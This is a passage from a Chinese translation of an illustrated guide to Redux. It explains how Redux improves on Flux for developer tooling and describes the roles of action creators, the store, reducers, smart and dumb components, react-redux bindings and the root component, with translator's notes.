JTR-Zj7aXeIE8yg.png)\n\n### \u95ee\u98982\uff1a\u6bcf\u6b21\u89e6\u53d1 action \u65f6\u72b6\u6001\u5bf9\u8c61\u90fd\u88ab\u76f4\u63a5\u6539\u5199\u4e86\n\n\u65f6\u95f4\u65c5\u884c\u8c03\u8bd5\u6cd5\u7684\u7279\u6027\u662f\uff1a\u4f60\u80fd\u638c\u63e1\u72b6\u6001\u5bf9\u8c61\u7684\u6bcf\u4e00\u6b21\u53d8\u5316\uff0c\u8fd9\u6837\u7684\u8bdd\uff0c\u4f60\u5c31\u80fd\u8f7b\u677e\u7684\u8df3\u56de\u5230\u8fd9\u4e2a\u5bf9\u8c61\u4e4b\u524d\u7684\u67d0\u4e2a\u72b6\u6001\uff08\u60f3\u8c61\u4e00\u4e2a\u64a4\u9500\u529f\u80fd\uff09\u3002\n\n\u8981\u5b9e\u73b0\u8fd9\u6837\u7684\u529f\u80fd\uff0c\u6bcf\u6b21\u72b6\u6001\u6539\u53d8\u4e4b\u540e\uff0c\u4f60\u90fd\u9700\u8981\u628a\u65e7\u7684\u72b6\u6001\u4fdd\u5b58\u5728\u4e00\u4e2a\u6570\u7ec4\u4e2d\u3002\u4f46\u662f\u7531\u4e8e JavaScript \u7684\u5bf9\u8c61\u5f15\u7528\u7279\u6027\uff0c\u7b80\u5355\u7684\u628a\u4e00\u4e2a\u5bf9\u8c61\u653e\u8fdb\u6570\u7ec4\u4e2d\u5e76\u4e0d\u80fd\u5b9e\u73b0\u6211\u4eec\u9700\u8981\u7684\u529f\u80fd\u3002\u8fd9\u6837\u505a\u4e0d\u80fd\u521b\u5efa\u4e00\u4e2a\u5feb\u7167\uff08snapshot\uff09\uff0c\u800c\u53ea\u662f\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61\u3002\n\n\u6240\u4ee5\u8981\u60f3\u5b9e\u73b0\u65f6\u95f4\u65c5\u884c\u7279\u6027\uff0c\u6bcf\u4e00\u4e2a\u72b6\u6001\u6539\u53d8\u7684\u7248\u672c\u90fd\u9700\u8981\u4fdd\u5b58\u5728\u4e0d\u540c\u7684 JavaScript \u5bf9\u8c61\u4e2d\uff0c\u8fd9\u6837\u4f60\u624d\u4e0d\u4f1a\u4e0d\u5c0f\u5fc3\u6539\u53d8\u4e86\u67d0\u4e2a\u5386\u53f2\u7248\u672c\u7684\u72b6\u6001\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*4zODv5vgvKsi6Ts7TihsoA.png)\n\n**\u89e3\u51b3\u65b9\u6848**\n\n\u5f53\u4e00\u4e2a action \u9700\u8981 store \u54cd\u5e94\u65f6\uff0c\u4e0d\u8981\u76f4\u63a5\u4fee\u6539 store \u4e2d\u7684\u72b6\u6001\uff0c\u800c\u662f\u5c06\u72b6\u6001\u62f7\u8d1d\u4e00\u4efd\u5e76\u5728\u8fd9\u4efd\u62f7\u8d1d\u7684\u72b6\u6001\u4e0a\u505a\u51fa\u4fee\u6539\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*wLRhZ0wtI0duLsigdxL1CA.png)\n\n### \u95ee\u98983\uff1a\u6ca1\u6709\u5408\u9002\u7684\u4f4d\u7f6e\u5f15\u5165\u7b2c\u4e09\u65b9\u63d2\u4ef6\n\n\u5f53\u4f60\u5728\u5199\u4e00\u4e9b\u8c03\u8bd5\u6027\u5de5\u5177\u65f6\uff0c\u4f60\u5e0c\u671b\u5b83\u4eec\u80fd\u591f\u66f4\u52a0\u901a\u7528\u3002\u4e00\u4e2a\u4f7f\u7528\u8be5\u5de5\u5177\u7684\u7528\u6237\u5e94\u8be5\u53ef\u4ee5\u76f4\u63a5\u5f15\u5165\u8fd9\u4e2a\u5de5\u5177\u800c\u4e0d\u9700\u8981\u505a\u989d\u5916\u7684\u5305\u88c5\u6216\u6865\u63a5\u3002\n\n\u8981\u5b9e\u73b0\u8fd9\u6837\u7684\u7279\u6027\uff0cFlux \u67b6\u6784\u9700\u8981\u4e00\u4e2a\u6269\u5c55\u70b9\u3002\n\n\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5c31\u662f\u65e5\u5fd7\u3002\u6bd4\u5982\u8bf4\u4f60\u5e0c\u671b console.log() \u6bcf\u4e00\u4e2a\u89e6\u53d1\u7684 action \u540c\u65f6 console.log() \u8fd9\u4e2a action \u88ab\u54cd\u5e94\u5b8c\u6210\u540e\u7684\u72b6\u6001\u3002\u5728 Flux \u4e2d\uff0c\u4f60\u53ea\u80fd\u8ba2\u9605\uff08subscribe\uff09 dispatcher \u7684\u66f4\u65b0\u548c\u6bcf\u4e00\u4e2a store \u7684\u53d8\u52a8\u3002\u4f46\u662f\u8fd9\u6837\u5c31\u4fb5\u5165\u4e86\u4e1a\u52a1\u4ee3\u7801\uff0c\u8fd9\u6837\u7684\u65e5\u5fd7\u529f\u80fd\u4e0d\u662f\u4e00\u4e2a\u7b2c\u4e09\u65b9\u63d2\u4ef6\u80fd\u591f\u8f7b\u6613\u5b9e\u73b0\u7684\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*MG736zGtLMBbSkhwu4D3cA.png)\n\n**\u89e3\u51b3\u65b9\u6848**\n\n\u5c06\u8fd9\u4e2a\u67b6\u6784\u7684\u90e8\u5206\u529f\u80fd\u5305\u88c5\u8fdb\u5176\u4ed6\u7684\u5bf9\u8c61\u4e2d\u5c06\u4f7f\u5f97\u6211\u4eec\u7684\u9700\u6c42\u53d8\u5f97\u66f4\u5bb9\u6613\u5b9e\u73b0\u3002\u8fd9\u4e9b\u300c\u5176\u4ed6\u5bf9\u8c61\u300d\u5728\u67b6\u6784\u539f\u6709\u7684\u529f\u80fd\u57fa\u7840\u4e4b\u4e0a\u6dfb\u52a0\u4e86\u81ea\u5df1\u7684\u529f\u80fd\u3002\u4f60\u53ef\u4ee5\u628a\u8fd9\u79cd\u6269\u5c55\u70b9\u770b\u505a\u662f\u4e00\u4e2a\u589e\u5f3a\u5668\uff08enhancers\uff09\u6216\u8005\u9ad8\u9636\u5bf9\u8c61\uff08higher order objects\uff09\uff0c\u4ea6\u6216\u8005\u4e2d\u95f4\u4ef6\uff08middleware\uff09\u3002\n\n\u6b64\u5916\uff0c\u4f7f\u7528\u4e00\u4e2a\u6811\u5f62\u7ed3\u6784\u6765\u7ec4\u7ec7\u6240\u6709\u6539\u53d8\u72b6\u6001\u7684\u903b\u8f91\uff0c\u8fd9\u6837\u5f53\u72b6\u6001\u53d1\u751f\u6539\u53d8\u7684\u65f6\u5019 store \u53ea\u4f1a\u89e6\u53d1\u4e00\u4e2a\u4e8b\u4ef6\u6765\u901a\u77e5\u89c6\u56fe\u5c42\uff08view\uff09\uff0c\u800c\u8fd9\u4e00\u4e2a\u4e8b\u4ef6\u4f1a\u88ab\u6574\u68f5\u6811\u4e2d\u7684\u6240\u6709\u903b\u8f91\u5904\u7406\uff08\u8bd1\u8005\u6ce8\uff1a\u300c\u5904\u7406\u300d\u4e0d\u4ee3\u8868\u4e00\u5b9a\u4f1a\u6539\u53d8\u72b6\u6001\uff0c\u8fd9\u4e9b\u6539\u53d8\u72b6\u6001\u7684\u903b\u8f91\u672c\u8d28\u4e0a\u662f\u51fd\u6570\uff0c\u51fd\u6570\u5185\u90e8\u4f1a\u6839\u636e action \u7684\u7c7b\u578b\u7b49\u6765\u786e\u5b9a\u662f\u5426\u5bf9\u72b6\u6001\u8fdb\u884c\u6539\u53d8\uff09\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*5JaZSc3Jsn9PJY7daEDVDA.png)\n\n*\u6ce8\u610f\uff1a\u5c31\u4e0a\u8ff0\u8fd9\u4e9b\u95ee\u9898\u548c\u89e3\u51b3\u65b9\u6848\u6765\u8bf4\uff0c\u6211\u4e3b\u8981\u5728\u5173\u6ce8\u5f00\u53d1\u8005\u5de5\u5177\u8fd9\u4e00\u4f7f\u7528\u573a\u666f\u3002\u5b9e\u9645\u4e0a\uff0c\u5bf9 Flux \u505a\u51fa\u7684\u8fd9\u4e9b\u6539\u53d8\u5728\u5176\u4ed6\u573a\u666f\u4e2d\u4e5f\u975e\u5e38\u6709\u5e2e\u52a9\u3002\u5728\u4e0a\u8ff0\u4e09\u70b9\u4e4b\u5916\uff0cFlux \u548c Redux \u8fd8\u6709\u66f4\u591a\u7684\u4e0d\u540c\u70b9\u3002\u6bd4\u5982\uff0c\u76f8\u6bd4\u4e8e Flux\uff0cRedux \u7cbe\u7b80\u4e86\u6574\u4e2a\u67b6\u6784\u7684\u5197\u4f59\u4ee3\u7801\uff0c\u5e76\u4e14\u590d\u7528 store \u7684\u903b\u8f91\u53d8\u5f97\u66f4\u52a0\u7b80\u5355\u3002\u8fd9\u91cc\u6709\u4e00\u4e2a [Redux \u4f18\u70b9\u7684\u5217\u8868](http:\/\/stackoverflow.com\/a\/32920459)\u53ef\u4f9b\u53c2\u8003\u3002\n\n\u90a3\u4e48\u8ba9\u6211\u4eec\u6765\u770b\u770b Redux \u662f\u600e\u4e48\u8ba9\u8fd9\u4e9b\u7279\u6027\u53d8\u4e3a\u73b0\u5b9e\u7684\u3002\n\n## \u65b0\u7684\u89d2\u8272\n\n\u4ece Flux \u6f14\u8fdb\u5230 Redux\uff0c\u6574\u4e2a\u67b6\u6784\u4e2d\u7684\u89d2\u8272\u53d1\u751f\u4e86\u4e9b\u8bb8\u7684\u53d8\u5316\u3002\n\n### Action creators\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1200\/1*Uljrrh4Z7UiUwk8AjUO9PA.png)\n\nRedux \u4fdd\u7559\u4e86 Flux \u4e2d action creator \u7684\u6982\u5ff5\u3002\u6bcf\u5f53\u4f60\u60f3\u8981\u6539\u53d8\u5e94\u7528\u4e2d\u7684\u72b6\u6001\u65f6\uff0c\u4f60\u5c31\u8981 dispatch \u4e00\u4e2a action\uff0c\u8fd9\u4e5f\u662f\u552f\u4e00\u6539\u53d8\u72b6\u6001\u7684\u65b9\u6cd5\u3002\n\n\u5c31\u50cf\u6211\u5728[\u8fd9\u7bc7\u5173\u4e8e Flux \u7684\u6587\u7ae0](https:\/\/code-cartoons.com\/a-cartoon-guide-to-flux-6157355ab207)\u4e2d\u63d0\u5230\u7684\u4e00\u6837\uff0c\u6211\u628a action creator \u770b\u505a\u662f\u4e00\u4e2a\u62a5\u52a1\u5458\uff08\u8d1f\u8d23\u53d1\u7535\u62a5\u7684\u4eba\uff0ctelegraph operator\uff09\uff0c\u4f60\u627e\u5230 action creator \u544a\u8bc9\u4ed6\u4f60\u5927\u81f4\u4e0a\u60f3\u8981\u4f20\u8fbe\u4ec0\u4e48\u4fe1\u606f\uff0caction creator \u5219\u4f1a\u628a\u8fd9\u4e9b\u4fe1\u606f\u683c\u5f0f\u5316\u4e3a\u4e00\u79cd\u6807\u51c6\u7684\u683c\u5f0f\uff0c\u4ee5\u4fbf\u7cfb\u7edf\u4e2d\u7684\u5176\u4ed6\u90e8\u5206\u80fd\u591f\u7406\u89e3\u3002\n\n\u4e0e Flux \u4e0d\u540c\u7684\u662f\uff0cRedux \u4e2d\u7684 action creator \u4e0d\u4f1a\u76f4\u63a5\u628a action \u53d1\u9001\u7ed9 dispatcher\uff0c\u800c\u662f\u8fd4\u56de\u4e00\u4e2a\u683c\u5f0f\u5316\u597d\u7684 JavaScript \u5bf9\u8c61\u3002\n\n### The store\n\n\u6211\u628a Flux \u4e2d store \u7684\u90a3\u4e00\u5957\u673a\u5236\u63cf\u8ff0\u4e3a\u4e00\u79cd\u63a7\u5236\u8fc7\u5ea6\u7684\u5b98\u50da\u4f53\u7cfb\u3002\u4f60\u4e0d\u80fd\u7b80\u5355\u76f4\u63a5\u7684\u4fee\u6539\u72b6\u6001\uff0c\u800c\u662f\u8981\u6c42\u6240\u6709\u7684\u72b6\u6001\u6539\u53d8\u90fd\u5fc5\u987b\u7531 store \u4eb2\u81ea\u4ea7\u751f\uff0c\u8fd8\u5fc5\u987b\u8981\u7ecf\u5386 action \u5206\u53d1\u90a3\u79cd\u5957\u8def\u3002\u5728 Redux \u4e2d\uff0cstore \u4f9d\u7136\u662f\u8fd9\u4e48\u7684\u5145\u6ee1\u63a7\u5236\u6b32\u548c\u5b98\u50da\u4e3b\u4e49\uff0c\u4f46\u662f\u53c8\u6709\u4e9b\u4e0d\u4e00\u6837\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1200\/1*Gztc7THzxzOgJmGvJ95IQA.png)\n\n\u5728 Flux \u4e2d\uff0c\u4f60\u53ef\u4ee5\u62e5\u6709\u591a\u4e2a store\uff0c\u6bcf\u4e00\u4e2a store \u90fd\u6709\u81ea\u5df1\u7684\u7edf\u6cbb\u6743\u3002\u6bcf\u4e2a store \u90fd\u4fdd\u5b58\u7740\u81ea\u5df1\u5bf9\u5e94\u7684\u90a3\u90e8\u5206\u72b6\u6001\uff0c\u4ee5\u53ca\u6240\u6709\u4fee\u6539\u8fd9\u4e9b\u72b6\u6001\u7684\u903b\u8f91\u3002\n\n\u800c Redux \u4e2d\u7684 store \u66f4\u559c\u6b22\u5c06\u6743\u529b\u4e0b\u653e\uff0c\u4e8b\u5b9e\u4e0a\u4e0d\u5f97\u4e0d\u8fd9\u4e48\u505a\u3002\u56e0\u4e3a\u5728 Redux \u4e2d\uff0c\u4f60\u53ea\u80fd\u6709\u4e00\u4e2a store\u2026\u2026\u6240\u4ee5\u5982\u679c\u4f60\u6253\u7b97\u50cf Flux \u90a3\u6837\u8ba9 store \u5b8c\u5168\u72ec\u7acb\u5904\u7406\u81ea\u5df1\u7684\u4e8b\u60c5\uff0c\u90a3\u4e48\u5728 Redux \u4e2d\uff0cstore \u91cc\u7684\u5de5\u4f5c\u91cf\u5c06\u53d8\u5f97\u975e\u5e38\u5927\u3002\n\n\u56e0\u6b64\uff0cRedux \u4e2d\u7684 store \u9996\u5148\u4f1a\u4fdd\u5b58\u6574\u4e2a\u5e94\u7528\u7684\u6240\u6709\u72b6\u6001\uff0c\u7136\u540e\u5c06\u300c\u5224\u65ad\u54ea\u4e00\u90e8\u5206\u72b6\u6001\u9700\u8981\u6539\u53d8\u300d\u7684\u4efb\u52a1\u5206\u914d\u4e0b\u53bb\u3002\u800c\u4ee5\u6839 reducer\uff08root reducer\uff09\u4e3a\u9996\u7684 reducer \u4eec\u5c06\u4f1a\u627f\u62c5\u8fd9\u4e2a\u4efb\u52a1\u3002\n\n\u4f60\u53ef\u80fd\u53d1\u73b0\u8fd9\u91cc\u597d\u50cf\u6ca1\u6709 dispatcher \u4ec0\u4e48\u4e8b\u3002\u662f\u7684\uff0c\u867d\u7136\u770b\u8d77\u6765\u6709\u70b9\u513f\u8d8a\u6743\uff0c\u4f46 Redux \u91cc\u7684 store \u5df2\u7ecf\u5b8c\u5168\u63a5\u7ba1\u4e86 dispatcher \u76f8\u5173\u7684\u5de5\u4f5c\u3002\n\n### The reducers\n\n\u5f53 store \u9700\u8981\u77e5\u9053\u4e00\u4e2a action \u89e6\u53d1\u540e\u72b6\u6001\u9700\u8981\u600e\u4e48\u6539\u53d8\u65f6\uff0c\u4ed6\u4f1a\u53bb\u8be2\u95ee reducer\u3002\u6839 reducer \u4f1a\u6839\u636e\u72b6\u6001\u5bf9\u8c61\u7684\u952e\uff08key\uff09\u5c06\u6574\u4e2a\u72b6\u6001\u6811\u8fdb\u884c\u62c6\u5206\uff0c\u7136\u540e\u5c06\u62c6\u5206\u540e\u7684\u6bcf\u4e00\u5757\u5b50\u72b6\u6001\u4f20\u5230\u77e5\u9053\u8be5\u600e\u4e48\u5bf9\u8fd9\u5757\u72b6\u6001\u8fdb\u884c\u54cd\u5e94\u7684\u5b50 reducer \u90a3\u91cc\u5904\u7406\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1200\/1*Vocy_6Gl9PbFlCIJsE9r3A.png)\n\n\u6211\u628a reducers \u770b\u505a\u662f\u5bf9\u590d\u5370\u60c5\u6709\u72ec\u949f\u7684\u767d\u9886\u4eec\u3002\u4ed6\u4eec\u4e0d\u5e0c\u671b\u628a\u4efb\u4f55\u4e8b\u641e\u7838\uff0c\u56e0\u6b64\u4ed6\u4eec\u4e0d\u4f1a\u4fee\u6539\u4efb\u4f55\u4f20\u9012\u7ed9\u4ed6\u4eec\u7684\u6587\u4ef6\u3002\u53d6\u800c\u4ee3\u4e4b\u7684\u662f\uff0c\u4ed6\u4eec\u4f1a\u5bf9\u8fd9\u4e9b\u6587\u4ef6\u8fdb\u884c\u590d\u5370\uff0c\u7136\u540e\u5728\u590d\u5370\u4ef6\u4e0a\u8fdb\u884c\u4fee\u6539\u3002\uff08\u8bd1\u8005\u6ce8\uff1a\u5f53\u7136\uff0c\u5f53\u8fd9\u4e9b\u4fee\u6539\u540e\u7684\u590d\u5370\u4ef6\u5b9a\u7a3f\u540e\uff0c\u4ed6\u4eec\u4e5f\u4e0d\u4f1a\u518d\u53bb\u4fee\u6539\u8fd9\u4e9b\u590d\u5370\u4ef6\u3002\uff09\n\n\u8fd9\u662f Redux \u7684\u6838\u5fc3\u601d\u60f3\u4e4b\u4e00\u3002\u4e0d\u76f4\u63a5\u4fee\u6539\u6574\u4e2a\u5e94\u7528\u7684\u72b6\u6001\u6811\uff0c\u800c\u662f\u5c06\u72b6\u6001\u6811\u7684\u6bcf\u4e00\u90e8\u5206\u8fdb\u884c\u62f7\u8d1d\u5e76\u4fee\u6539\u62f7\u8d1d\u540e\u7684\u90e8\u5206\uff0c\u7136\u540e\u5c06\u8fd9\u4e9b\u90e8\u5206\u91cd\u65b0\u7ec4\u5408\u6210\u4e00\u9897\u65b0\u7684\u72b6\u6001\u6811\u3002\n\n\u5b50 reducers \u4f1a\u628a\u4ed6\u4eec\u521b\u5efa\u7684\u526f\u672c\u4f20\u56de\u7ed9\u6839 reducer\uff0c\u800c\u6839 reducer \u4f1a\u628a\u8fd9\u4e9b\u526f\u672c\u7ec4\u5408\u8d77\u6765\u5f62\u6210\u4e00\u9897\u65b0\u7684\u72b6\u6001\u6811\u3002\u6700\u540e\u6839 reducer \u5c06\u65b0\u7684\u72b6\u6001\u6811\u4f20\u56de\u7ed9 store\uff0cstore \u518d\u5c06\u65b0\u7684\u72b6\u6001\u6811\u8bbe\u4e3a\u6700\u7ec8\u7684\u72b6\u6001\u3002\n\n\u5982\u679c\u4f60\u6709\u4e00\u4e2a\u5c0f\u578b\u5e94\u7528\uff0c\u4f60\u53ef\u80fd\u53ea\u6709\u4e00\u4e2a reducer \u5bf9\u6574\u4e2a\u72b6\u6001\u6811\u8fdb\u884c\u62f7\u8d1d\u5e76\u4f5c\u51fa\u4fee\u6539\u3002\u53c8\u6216\u8005\u4f60\u6709\u4e00\u4e2a\u8d85\u5927\u7684\u5e94\u7528\uff0c\u4f60\u53ef\u80fd\u4f1a\u6709\u82e5\u5e72\u4e2a reducers \u5bf9\u6574\u4e2a\u72b6\u6001\u6811\u8fdb\u884c\u4fee\u6539\u3002\u8fd9\u4e5f\u662f Flux \u548c Redux \u7684\u53e6\u4e00\u5904\u533a\u522b\u3002\u5728 Flux \u4e2d\uff0cstore \u5e76\u4e0d\u9700\u8981\u4e0e\u5176\u4ed6 store \u4ea7\u751f\u5173\u8054\uff0c\u800c\u4e14 store \u7684\u7ed3\u6784\u662f\u6241\u5e73\u7684\u3002\u800c\u5728 Redux \u4e2d\uff0creducers \u662f\u6709\u5c42\u7ea7\u7ed3\u6784\u7684\u3002\u8fd9\u79cd\u5c42\u7ea7\u7ed3\u6784\u53ef\u4ee5\u6709\u82e5\u5e72\u5c42\uff0c\u5c31\u50cf\u7ec4\u4ef6\u7684\u5c42\u7ea7\u7ed3\u6784\u90a3\u6837\u3002\n\n### The views: \u667a\u80fd\u7ec4\u4ef6\uff08smart components\uff09\u548c\u6728\u5076\u7ec4\u4ef6(dumb components)\n\nFlux \u62e5\u6709\u63a7\u5236\u578b\u89c6\u56fe\uff08controller views\uff09 \u548c\u5e38\u89c4\u578b\u89c6\u56fe\uff08regular views\uff09\u3002\u63a7\u5236\u578b\u89c6\u56fe\u5c31\u50cf\u662f\u4e00\u4e2a\u7ecf\u7406\u4e00\u6837\uff0c\u7ba1\u7406\u7740 store \u548c\u5b50\u89c6\u56fe\uff08child views\uff09\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1200\/1*TgCkFcjlD9SxSrMvVX3DrA.png)\n\n\u5728 Redux \u4e2d\uff0c\u4e5f\u6709\u4e00\u4e2a\u7c7b\u4f3c\u7684\u6982\u5ff5\uff1a\u667a\u80fd\u7ec4\u4ef6\u548c\u6728\u5076\u7ec4\u4ef6\u3002\uff08\u8bd1\u8005\u6ce8\uff1a\u5728\u6700\u65b0\u7684 Redux \u6587\u6863\u4e2d\uff0c\u5b83\u4eec\u5206\u522b\u53eb\u505a\u5bb9\u5668\u578b\u7ec4\u4ef6 Container component \u548c\u5c55\u793a\u578b\u7ec4\u4ef6 Presentational component\uff09\u667a\u80fd\u7ec4\u4ef6\u7684\u804c\u8d23\u5c31\u50cf\u7ecf\u7406\u4e00\u6837\uff0c\u4f46\u662f\u6bd4\u8d77 Flux \u4e2d\u7684\u89d2\u8272\uff0cRedux \u5bf9\u7ecf\u7406\u7684\u804c\u8d23\u6709\u4e86\u66f4\u591a\u7684\u5b9a\u4e49\uff1a\n\n - \u667a\u80fd\u7ec4\u4ef6\u8d1f\u8d23\u6240\u6709\u7684 action \u76f8\u5173\u7684\u5de5\u4f5c\u3002\u5982\u679c\u667a\u80fd\u7ec4\u4ef6\u91cc\u5305\u542b\u7684\u4e00\u4e2a\u6728\u5076\u7ec4\u4ef6\u9700\u8981\u89e6\u53d1\u4e00\u4e2a action\uff0c\u667a\u80fd\u7ec4\u4ef6\u4f1a\u901a\u8fc7 props \u4f20\u4e00\u4e2a function \u7ed9\u6728\u5076\u7ec4\u4ef6\uff0c\u800c\u6728\u5076\u7ec4\u4ef6\u53ef\u4ee5\u5728\u9700\u8981\u89e6\u53d1 action \u65f6\u8c03\u7528\u8fd9\u4e2a function\u3002\n - \u667a\u80fd\u7ec4\u4ef6\u4e0d\u5b9a\u4e49 CSS \u6837\u5f0f\u3002\n - \u667a\u80fd\u7ec4\u4ef6\u51e0\u4e4e\u4e0d\u4f1a\u4ea7\u751f\u81ea\u5df1\u7684 DOM \u8282\u70b9\uff0c\u4ed6\u7684\u5de5\u4f5c\u662f\u7ec4\u7ec7\u82e5\u5e72\u7684\u6728\u5076\u7ec4\u4ef6\uff0c\u7531\u6728\u5076\u7ec4\u4ef6\u6765\u751f\u6210\u6700\u7ec8\u7684 DOM \u8282\u70b9\u3002\n\n\u6728\u5076\u7ec4\u4ef6\u4e0d\u4f1a\u76f4\u63a5\u4f9d\u8d56 action\uff08\u8bd1\u8005\u6ce8\uff1a\u5373\u4e0d\u4f1a\u5728\u6728\u5076\u7ec4\u4ef6\u91cc `require` action \u76f8\u5173\u7684\u6587\u4ef6\uff09\uff0c\u56e0\u4e3a\u6240\u6709\u7684 action \u90fd\u4f1a\u5f53\u505a props \u4f20\u4e0b\u6765\u3002\u8fd9\u610f\u5473\u7740\u6728\u5076\u7ec4\u4ef6\u53ef\u4ee5\u88ab\u4efb\u4f55\u4e00\u4e2a\u903b\u8f91\u4e0d\u540c\u7684 App \u62ff\u53bb\u4f7f\u7528\u3002\u540c\u65f6\u6728\u5076\u7ec4\u4ef6\u4e5f\u9700\u8981\u6709\u4e00\u5b9a\u7684\u6837\u5f0f\u6765\u8ba9\u81ea\u5df1\u53d8\u5f97\u597d\u770b\u4e00\u4e9b\uff08\u5f53\u7136\u4f60\u53ef\u4ee5\u8ba9\u6728\u5076\u7ec4\u4ef6\u63a5\u53d7\u67d0\u4e9b props \u4f5c\u4e3a\u8bbe\u7f6e\u6837\u5f0f\u7684\u53d8\u91cf\uff09\u3002\n\n### \u89c6\u56fe\u5c42\u7ed1\u5b9a\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1200\/1*D1RcVrMV2rp6AH9hk5xZ8g.png)\n\n\u8981\u628a store \u7ed1\u5b9a\u5230\u89c6\u56fe\u4e0a\uff0cRedux \u8fd8\u9700\u8981\u4e00\u70b9\u5e2e\u52a9\u3002\u5982\u679c\u4f60\u5728\u4f7f\u7528 React\uff0c\u90a3\u4e48\u4f60\u9700\u8981\u4f7f\u7528 react-redux\u3002\n\n\u89c6\u56fe\u7ed1\u5b9a\u5de5\u4f5c\u6709\u70b9\u50cf\u4e3a\u7ec4\u4ef6\u6811\u670d\u52a1\u7684 IT \u90e8\u95e8\u3002IT \u90e8\u95e8\u786e\u4fdd\u6240\u6709\u7684\u7ec4\u4ef6\u90fd\u6b63\u786e\u7684\u7ed1\u5b9a\u5230 store \u4e0a\uff0c\u5e76\u5904\u7406\u5404\u79cd\u6280\u672f\u4e0a\u7684\u7ec6\u8282\uff0c\u4ee5\u786e\u4fdd\u4f59\u4e0b\u5c42\u7ea7\u7684\u7ec4\u4ef6\u5bf9\u7ed1\u5b9a\u76f8\u5173\u7684\u64cd\u4f5c\u6beb\u65e0\u611f\u77e5\u3002\n\n\u89c6\u56fe\u5c42\u7ed1\u5b9a\u5f15\u5165\u4e86\u4e09\u4e2a\u6982\u5ff5\uff1a\n\n 1. `<Provider>` \u7ec4\u4ef6\uff1a \u8fd9\u4e2a\u7ec4\u4ef6\u9700\u8981\u5305\u88f9\u5728\u6574\u4e2a\u7ec4\u4ef6\u6811\u7684\u6700\u5916\u5c42\u3002\u8fd9\u4e2a\u7ec4\u4ef6\u8ba9\u6839\u7ec4\u4ef6\u7684\u6240\u6709\u5b50\u5b59\u7ec4\u4ef6\u80fd\u591f\u8f7b\u677e\u7684\u4f7f\u7528 `connect()` \u65b9\u6cd5\u7ed1\u5b9a store\u3002\n 2. `connect()`\uff1a\u8fd9\u662f `react-redux` \u63d0\u4f9b\u7684\u4e00\u4e2a\u65b9\u6cd5\u3002\u5982\u679c\u4e00\u4e2a\u7ec4\u4ef6\u60f3\u8981\u54cd\u5e94\u72b6\u6001\u7684\u53d8\u5316\uff0c\u5c31\u628a\u81ea\u5df1\u4f5c\u4e3a\u53c2\u6570\u4f20\u7ed9 connect() \u7684\u7ed3\u679c\uff08\u8bd1\u8005\u6ce8\uff1aconnect() \u8fd4\u56de\u7684\u4f9d\u7136\u662f\u4e00\u4e2a\u51fd\u6570\uff09\uff0cconnect() \u65b9\u6cd5\u4f1a\u5904\u7406\u4e0e store \u7ed1\u5b9a\u7684\u7ec6\u8282\uff0c\u5e76\u901a\u8fc7 selector \u786e\u5b9a\u8be5\u7ed1\u5b9a store \u4e2d\u54ea\u4e00\u90e8\u5206\u7684\u6570\u636e\u3002\n 3. `selector`\uff1a\u8fd9\u662f\u4f60\u81ea\u5df1\u7f16\u5199\u7684\u4e00\u4e2a\u51fd\u6570\u3002\u8fd9\u4e2a\u51fd\u6570\u58f0\u660e\u4e86\u4f60\u7684\u7ec4\u4ef6\u9700\u8981\u6574\u4e2a store \u4e2d\u7684\u54ea\u4e00\u90e8\u5206\u6570\u636e\u4f5c\u4e3a\u81ea\u5df1\u7684 props\u3002\n\n### \u6839\u7ec4\u4ef6\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1200\/1*JXPeiNP-it60-QYKb-p2eQ.png)\n\n\u6240\u6709\u7684 React \u5e94\u7528\u90fd\u5b58\u5728\u4e00\u4e2a\u6839\u7ec4\u4ef6\uff08root component\uff09\u3002\u4ed6\u5176\u5b9e\u5c31\u662f\u6574\u4e2a\u7ec4\u4ef6\u6811\u6700\u5916\u5c42\u7684\u90a3\u4e2a\u7ec4\u4ef6\uff0c\u4f46\u662f\u5728 Redux \u4e2d\uff0c\u6839\u7ec4\u4ef6\u8fd8\u8981\u627f\u62c5\u989d\u5916\u7684\u4efb\u52a1\u3002\n\n\u6839\u7ec4\u4ef6\u627f\u62c5\u7684\u89d2\u8272\u6709\u70b9\u50cf\u4f01\u4e1a\u4e2d\u7684\u9ad8\u7ba1\uff0c\u4ed6\u5c06\u6574\u4e2a\u56e2\u961f\u6574\u5408\u5230\u4e00\u8d77\u6765\u5b8c\u6210\u67d0\u9879\u4efb\u52a1\u3002\u4ed6\u4f1a\u521b\u5efa store\uff0c\u5e76\u544a\u8bc9 store \u4f7f\u7528\u54ea\u4e9b reducers\uff0c\u5e76\u6700\u7ec8\u5b8c\u6210\u89c6\u56fe\u5c42\u7684\u7ed1\u5b9a\u3002\n\n\u5f53\u5b8c\u6210\u6574\u4e2a\u5e94\u7528\u7684\u521d\u59cb\u5316\u5de5\u4f5c\u540e\uff0c\u6839\u7ec4\u4ef6\u7684\u5c31\u4e0d\u518d\u63d2\u624b\u6574\u4e2a\u5e94\u7528\u7684\u8fd0\u884c\u8fc7\u7a0b\u4e86\u3002\u6bcf\u4e00\u6b21\u91cd\u65b0\u6e32\u67d3\uff08re-render\uff09\u90fd\u6ca1\u6709\u6839\u7ec4\u4ef6\u4ec0\u4e48\u4e8b\uff0c\u8fd9\u4e9b\u6d3b\u513f\u90fd\u7531\u6839\u7ec4\u4ef6\u4e0b\u9762\u7684\u5b50\u7ec4\u4ef6\u5b8c\u6210\uff0c\u5f53\u7136\u4e5f\u5c11\u4e0d\u4e86\u89c6\u56fe\u5c42\u7ed1\u5b9a\u7684\u529f\u52b3\u3002\n\n## Redux 